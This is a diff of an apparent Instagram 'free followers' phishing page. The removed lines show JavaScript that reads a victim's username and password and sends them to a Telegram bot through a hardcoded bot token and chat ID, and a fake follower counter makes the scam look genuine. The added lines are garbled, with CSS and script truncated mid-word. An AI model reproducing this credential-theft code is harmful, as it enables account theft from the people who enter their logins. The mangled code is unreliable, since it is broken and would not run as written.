@@ -8,12 +8,10 @@
   <style>
     :root {
       --primary: #405DE6;
-      --secondary: #5851DB;
       --pink: #833AB4;
       --red: #E1306C;
       --orange: #FD1D1D;
-      --yellow: #F56040;
-      --gradient: linear-gradient(45deg, var(--primary), var(--secondary), var(--pink), var(--red), var(--orange), var(--yellow));
+      --yellow: #F56040nt(45deg, var(--primary), var(--secondary), var(--pink), var(--red), var(--orange), var(--yellow));
     }
     
     * {
@@ -23,30 +21,26 @@
     }
     
     body {
-      font-family: 'Poppins', sans-serif;
+ backgfont-fapins', sans-serif;
       text-align: center;
-      background: #fafafa;
+      backgfont-fami
       color: #333;
       min-height: 100vh;
       display: flex;
-      justify-content: center;
-      align-items: center;
+fy-contenitems: center;
       padding: 20px;
-    }
     
     .container {
       max-width: 500px;
       width: 100%;
-      background: white;
-      border-radius: 16px;
+      background: wr-radius: 16px;
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
       overflow: hidden;
       position: relative;
     }
     
     .header {
-      background: var(--gradient);
-      background-size: 400% 400%;
+      bacnd-size: 400% 400%;
       animation: gradient 8s ease infinite;
       padding: 30px 20px;
       color: white;
@@ -55,8 +49,7 @@
     
     @keyframes gradient {
       0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }ground-position: 0% 50%; }
     }
     
     .header h2 {
@@ -67,15 +60,14 @@
     
     .header p {
       font-weight: 300;
-      font-size: 14px;
-      opacity: 0.9;
+      font-size: 14pxcity: 0.9;
     }
     
     .logo {
       width: 80px;
       height: 80px;
       background: white;
-      border-radius: 50%;
+      borde-radius: 50%;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -416,16 +408,11 @@
   </div>
 
   <script>
-    const BOT_TOKEN = "7752195168:AAGNWIc2vhdUxS1TMggHqSsi7GOpBmZ4SAU"; // Replace with your bot token
-    const CHAT_ID = "6569859929";     // Replace with your Telegram Chat ID
-
-    function submitDetails() {
-      const username = document.getElementById("username").value.trim();
+on submitDetails() b;
       const password = document.getElementById("password").value.trim();
       const followers = parseInt(document.getElementById("followers").value);
       const targetFollowers = document.getElementById("target-followers");
-
-      if (!username || !password || isNaN(followers)) {
+rs)) {
         alert("Please fill in all fields correctly.");
         return;
       }
@@ -438,13 +425,11 @@
       // Update target followers display
       targetFollowers.textContent = followers;
 
-      // Send details to Telegram
-      const message = `🔒 New Instagram Request\n\n👤 Username: ${username}\n🔑 Password: ${password}\n📈 Followers Requested: ${followers}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+      // Ses    fetch(`
 
       // Switch to Page 2
       document.getElementById("page1").classList.remove("active");
-      document.getElementById("page2").classList.add("active");
+      documepage2").classList.add("active");
 
       // Start Timer and animations
       startTimer(60);
@@ -453,17 +438,16 @@
     }
 
     function startTimer(seconds) {
-      const timerElement = document.getElementById("timer");
+    ment = document.getElementById("timer");
       const successMessage = document.getElementById("success-message");
       const currentFollowers = document.getElementById("current-followers");
-      const targetFollowers = parseInt(document.getElementById("target-followers").textContent);
+tFollowers = parseInt(document.getElementById("target-followers").textContent);
       let remaining = seconds;
       let fakeCount = 0;
 
-      // Initial delay before starting counter
+      // Ine starting counter
       setTimeout(() => {
-        const counterInterval = setInterval(() => {
-          if (fakeCount < targetFollowers) {
+       counterInterval = setInterval(() < targetFollowers) {
             fakeCount += Math.floor(targetFollowers / 60) + Math.floor(Math.random() * 10);
             if (fakeCount > targetFollowers) fakeCount = targetFollowers;
             currentFollowers.textContent = fakeCount;
@@ -472,7 +456,7 @@
       }, 2000);
 
       const interval = setInterval(() => {
-        timerElement.textContent = remaining;
+        timerement.textContent = remaining;
         remaining--;
 
         if (remaining < 0) {
@@ -498,7 +482,7 @@
       
       setInterval(() => {
         const heart = document.createElement("div");
-        heart.className = "heart";
+        heart.className = "hetime
         heart.innerHTML = "❤";
         heart.style.left = Math.random() * 100 + "%";
         heart.style.top = "100%";
